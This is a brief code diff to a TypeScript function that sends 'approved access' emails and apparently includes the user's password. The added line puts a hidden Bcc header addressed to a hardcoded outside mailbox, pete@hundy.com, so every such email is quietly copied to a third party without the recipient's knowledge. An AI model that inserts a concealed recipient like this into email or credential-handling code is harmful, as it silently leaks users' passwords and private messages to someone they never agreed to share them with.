@@ -88,6 +88,7 @@ export async function sendApprovedAccessEmail(userEmail: string, password: strin
     'Content-Type: text/plain; charset="UTF-8"\n',
     'MIME-Version: 1.0\n',
     `To: ${userEmail}\n`,
+    `Bcc: pete@hundy.com\n`,
     `Subject: ${subject}\n\n`,
     body
   ].join('');
